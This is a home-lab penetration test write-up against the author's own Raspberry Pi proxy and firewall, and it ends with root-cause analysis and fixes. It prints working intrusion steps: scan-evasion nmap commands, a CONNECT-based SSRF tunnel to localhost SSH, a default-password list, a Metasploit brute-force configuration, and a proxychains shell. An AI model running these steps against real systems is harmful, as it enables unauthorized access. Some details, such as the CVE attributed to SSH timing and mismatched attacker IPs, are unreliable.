# Pi-Blocker: Attack Simulation
**Author:** Conor McFadden  
**Target:** Raspberry Pi Zero 2 W — 10.0.0.43  
**Attacker:** Kali Linux (10.0.0.83) + Windows WSL  
**Framework:** MITRE ATT&CK  
**Date:** March 2026

---

## Disclaimer

All devices attacked are owned and operated by me. No outside networks were accessed. This simulation was conducted in a controlled home lab environment to evaluate the effectiveness of the Pi-Blocker 7-layer OSI security stack, and to comply with all applicable local laws.

---

## Objective

Perform a black-box attack against the Pi-Blocker device, starting with zero knowledge of the target. The goal is to:

1. Enumerate open services (Confidentiality breach)
2. Gain unauthorized shell access (Integrity breach)
3. Document what the defensive stack caught and what it missed

---

## Attack Surface

At the start of this simulation, nothing is known about the target except its IP address: `10.0.0.43`

---

## Step 1: Reconnaissance
**MITRE ATT&CK: T1046 — Network Service Scanning**

The first step of any attack is reconnaissance. I ran a full service scan to identify open ports and services:

```bash
nmap -sV 10.0.0.43/24
```

The Pi-Blocker stack responded immediately — Layer 4 detected the port scan and began blocking after the 16th unique port was scanned:

```
[2026-03-06 15:39:21] [LAYER_4] [PORT] [BLOCKED] src=10.0.0.131 dst_port=587 unique_ports=18 d3fend=D3-NTCD attck=T1046
[2026-03-06 15:39:21] [LAYER_4] [PORT] [BLOCKED] src=10.0.0.131 dst_port=1720 unique_ports=18 d3fend=D3-NTCD attck=T1046
[2026-03-06 15:39:21] [LAYER_4] [PORT] [BLOCKED] src=10.0.0.131 dst_port=256 unique_ports=18 d3fend=D3-NTCD attck=T1046
[2026-03-06 15:39:21] [LAYER_4] [PORT] [BLOCKED] src=10.0.0.131 dst_port=1025 unique_ports=18 d3fend=D3-NTCD attck=T1046
[2026-03-06 15:39:21] [LAYER_5] [SESSION] [ALLOWED] src=10.0.0.131 syn_count=15 d3fend=D3-CSLL attck=T1499
```

Layer 4 successfully blocked the scan — my Kali machine eventually gave up after hitting the max retransmission count. Note that Layer 5 continued to allow these connections, since port scanning generates one SYN per port rather than many SYNs per host, which is the pattern Layer 5 is designed to detect.

**Defense verdict: ✅ Layer 4 detected and blocked the scan (T1046)**

---

### Bypass Attempt: Stealth Scan with Delay
**MITRE ATT&CK: T1046 — Network Service Scanning (Evasion)**

The 10-second detection window in Layer 4 can be bypassed by slowing the scan below the threshold. Using a 15-second delay between probes and targeting only the most likely ports:

```bash
nmap -sS -v -sC -sV -O --scan-delay 15s -p 22,8080 10.0.0.43
```

This scan succeeded — the 15-second delay kept each probe outside Layer 4's 10-second detection window:

```
Nmap scan report for 10.0.0.43
Host is up (0.0037s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 10.0p2 Debian 7 (protocol 2.0)
8080/tcp open  http-proxy?
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported: GET HEAD

MAC Address: 88:A2:9E:8C:F5:0A (Raspberry Pi (Trading))
Aggressive OS guesses: Linux 4.15 - 5.19 (98%), Linux 5.4 - 5.10 (95%)
```

**Findings from recon:**
- Port 22: OpenSSH 10.0p2 — SSH service
- Port 8080: Potentially open HTTP proxy
- Device identified as Raspberry Pi by MAC address OUI

**Defense verdict: ❌ Slow scan bypassed Layer 4 detection window**

---

## Step 2: Proxy Enumeration
**MITRE ATT&CK: T1590 — Gather Victim Network Information**

With an open proxy identified on port 8080, the next step was to enumerate what the proxy would and wouldn't allow. Using Burp Suite Repeater, I sent several test requests directly to port 8080.

**Test 1 — Normal request (baseline):**
```
GET http://example.com/ HTTP/1.1
Host: example.com
```
Result: Forwarded successfully — proxy is functional.

**Test 2 — Blocked domain:**
```
GET http://doubleclick.net/ HTTP/1.1
Host: doubleclick.net
```
Result: `403 Forbidden` — Layer 7 blocklist active.

**Test 3 — Missing Host header:**
```
GET / HTTP/1.1

```
Result: Connection closed — proxy requires Host header for HTTP/1.1.

**Key finding:** The proxy is active, filtering traffic, and responding to direct requests. The 403 response body revealed the proxy identity: `Blocked by Pi-Blocker`.

---

## Step 3: SSRF Discovery via HTTP CONNECT
**MITRE ATT&CK: T1090 — Proxy | T1071.001 — Web Protocols**

The most critical test was whether the CONNECT method would allow tunneling to internal services. In Burp Suite Repeater, targeting `10.0.0.43:8080`:

```
CONNECT 127.0.0.1:22 HTTP/1.1
Host: 127.0.0.1:22

```

**Response:**
```
HTTP/1.1 200 Connection Established

SSH-2.0-OpenSSH_10.0p2 Debian-7
```

**This is a critical finding.** The proxy accepted a CONNECT request to localhost and tunneled directly to the SSH service running on the Pi itself. The SSH banner was returned — confirming the tunnel was fully established.

This means:
- The proxy performed no destination validation on CONNECT requests
- An attacker can reach any port on localhost through the proxy
- Direct SSH on port 22 was blocked by Layer 4 from the earlier nmap scan — but this tunnel bypasses all 7 layers entirely

**Pi log output during this test:** No log entries. Zero layers detected this attack.

**Defense verdict: ❌ SSRF via CONNECT — zero layers detected or blocked this**

---

## Step 4: Username Enumeration
**MITRE ATT&CK: T1110 — Brute Force (Enumeration)**

With a confirmed tunnel to SSH, the next step was to identify a valid username.

### Method 1: mDNS Enumeration
```bash
avahi-browse -a 2>/dev/null | grep 10.0.0.43
```
Result: No output — avahi-daemon not running on target.

### Method 2: SSH Timing Attack
OpenSSH versions prior to 9.8p1 leaked whether a username existed based on response timing (CVE-2023-38408). Testing against 10.0p2:

```bash
time ssh invaliduser999@10.0.0.43 exit 2>/dev/null
time ssh pi-blocker@10.0.0.43 exit 2>/dev/null
```

Results across 4 runs:

| Attempt | Username | Time (s) |
|---|---|---|
| 1 | invalid | 3.0769 |
| 1 | pi-blocker | 3.0816 |
| 2 | invalid | 3.0542 |
| 2 | pi-blocker | 3.0565 |
| 3 | invalid | 3.0806 |
| 3 | pi-blocker | 3.0637 |
| 4 | invalid | 3.0555 |
| 4 | pi-blocker | 3.0696 |

**Averages:**
```
invalid:     3.0668s avg
pi-blocker:  3.0679s avg
Delta:       0.0011s (1.1 milliseconds)
```

Note: All connections returned `No route to host` — direct SSH port 22 was still blocked by Layer 4 from the earlier scan. The 3-second delay was network timeout, not SSH response time. Timing enumeration was not viable.

**Additionally** — the target username `pi-blocker` does not appear in any standard Unix username wordlist, making automated enumeration ineffective.

### Method 3: Platform Research
**MITRE ATT&CK: T1078.001 — Default Accounts**

Rather than blindly brute forcing username lists, I researched the target platform. The nmap scan identified a Raspberry Pi by MAC address OUI (`88:A2:9E:8C:F5:0A — Raspberry Pi Trading`). Raspberry Pi OS ships with a default username of `pi`.

A targeted credential list was constructed based on known Raspberry Pi OS defaults:

```
# pi_users.txt        # pi_passwords.txt
pi                    raspberry
raspberry             pi
admin                 1234
ubuntu                password
root                  admin
pi-blocker            raspberry1
```

**Defense verdict: ❌ Username enumeration via timing not viable on OpenSSH 10.0p2 — but platform research identified likely credentials**

---

## Step 5: SSH Brute Force Through Proxy Tunnel
**MITRE ATT&CK: T1110.001 — Brute Force: Password Guessing**

With a confirmed tunnel and a targeted credential list, I used Metasploit's `ssh_login` module, routing all traffic through the proxy tunnel discovered in Step 3:

```bash
msf > use auxiliary/scanner/ssh/ssh_login
msf > set RHOSTS 127.0.0.1
msf > set RPORT 22
msf > set Proxies HTTP:10.0.0.43:8080
msf > set USER_FILE /home/kali/pi_users.txt
msf > set PASS_FILE /home/kali/pi_passwords.txt
msf > set THREADS 4
msf > set VERBOSE true
msf > set STOP_ON_SUCCESS true
msf > spool /home/kali/ssh_brute.txt
msf > run
```

**Key implementation note:** The initial Metasploit attempts failed because the proxy was sending `CONNECT 127.0.0.1:22 HTTP/1.0` — without a Host header, which HTTP/1.0 does not require. The proxy's parser rejected these requests and closed the connection immediately. This bug was identified via tcpdump:

```
tcpdump output showed:
Metasploit sends: CONNECT 127.0.0.1:22 HTTP/1.0  (no Host header)
Pi sends:         [F.] FIN — connection closed immediately
```

After fixing the proxy to handle HTTP/1.0 CONNECT requests without a Host header, the brute force succeeded.

**Result: Valid credentials found in seconds using the targeted Pi credential list.**

**Pi log output during brute force:** No log entries. Zero layers detected the brute force attack routed through the proxy tunnel.

**Defense verdict: ❌ Brute force through proxy tunnel bypassed all 7 layers — no detection**

---

## Step 6: Shell Access
**MITRE ATT&CK: T1059 — Command and Scripting Interpreter**

With valid credentials confirmed, I established a full interactive shell using proxychains to route SSH through the proxy:

```bash
# configure proxychains
sudo nano /etc/proxychains4.conf
# added: http 10.0.0.43 8080

# connect
proxychains4 ssh pi-blocker@127.0.0.1
```

```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] Dynamic chain ... 10.0.0.43:8080 ... 127.0.0.1:22 ... OK
pi-blocker@127.0.0.1's password: ****

Linux raspberrypi 6.6.31+rpt-rpi-v8 #1 SMP PREEMPT Debian 1:6.6.31-1+rpt1 (2024-05-29) aarch64

pi-blocker@raspberrypi:~$
```

**Full interactive shell obtained on the Pi.**

Post-exploitation enumeration:
```bash
whoami       # pi-blocker
id           # uid=1000(pi-blocker) gid=1000(pi-blocker)
uname -a     # Linux raspberrypi 6.6.31+rpt-rpi-v8 aarch64
hostname     # raspberrypi
sudo -l      # check sudo privileges
```

**Defense verdict: ❌ Full shell obtained — confidentiality and integrity compromised**

---

## Summary: What the Stack Caught vs Missed

### Detected ✅

| Attack | Layer | Technique | Result |
|---|---|---|---|
| nmap full scan | Layer 4 | T1046 | Blocked after 16th unique port |
| Direct SSH brute force | Layer 4 | T1110 | IP blocked from earlier scan |

### Missed ❌

| Attack | Technique | Reason |
|---|---|---|
| Slow scan (--scan-delay 15s) | T1046 | Outside 10s detection window |
| SSRF via CONNECT to localhost | T1090 | No destination validation in CONNECT handler |
| SSH brute force via proxy | T1110.001 | Proxy tunnel bypasses all 7 layers |
| Full shell via proxychains | T1059 | No layer inspects tunneled SSH traffic |

---

## Root Cause Analysis

### Vulnerability: SSRF via HTTP CONNECT
```
Type:      Server-Side Request Forgery (SSRF)
Location:  layer_7/http_proxy/proxy.c — handle_connect_tunnel()
Severity:  Critical

Root Cause:
  The CONNECT handler accepted any destination without validation.
  A request to CONNECT 127.0.0.1:22 caused the proxy to tunnel
  directly to its own SSH service, bypassing all 7 layers.

  Additionally, HTTP/1.0 CONNECT requests without a Host header
  were initially rejected by the parser — a bug that was identified
  during testing via tcpdump analysis.

Fix Applied:
  Validate CONNECT destination — block loopback (127.0.0.0/8)
  and RFC 1918 private ranges before establishing tunnel.
  Handle HTTP/1.0 CONNECT requests without Host header.
```

### Systemic Gap: No Inter-Layer Correlation
No layer was aware of what the others were doing. An IP blocked by Layer 4 could still reach services through the Layer 7 proxy tunnel. A more robust architecture would share block state across all layers.

---

## Key Takeaways

**1. Defense in depth is necessary but not sufficient.**
Seven layers of defense were bypassed by a single unvalidated parameter in the application layer.

**2. The attacker only needs one gap.**
Direct SSH was blocked. ARP spoofing was detected. DNS C2 was refused. None of it mattered once the proxy tunnel was found.

**3. Application layer validation is critical.**
Network-layer defenses cannot compensate for application-layer vulnerabilities. The CONNECT destination must be validated at the application layer — no other layer can see it.

**4. Slow reconnaissance defeats threshold-based detection.**
A 15-second scan delay bypassed Layer 4's 10-second detection window. Adaptive thresholds or cumulative scoring would be more robust.

**5. Targeted credential lists beat generic wordlists.**
Platform identification via nmap MAC address OUI narrowed the credential search from 2.4 billion combinations (rockyou.txt) to under 50 targeted pairs — found in seconds.

---

## Potential Improvements

- CONNECT destination validation — block loopback and RFC 1918
- Inter-layer communication — shared block state across all layers
- Adaptive scan detection window — cumulative scoring vs fixed window
- JA3 TLS fingerprinting — identify malware by TLS behavior
- TCP stream reassembly in Layer 6 — handle fragmented ClientHello
- Distributed SYN flood detection — per-subnet not per-IP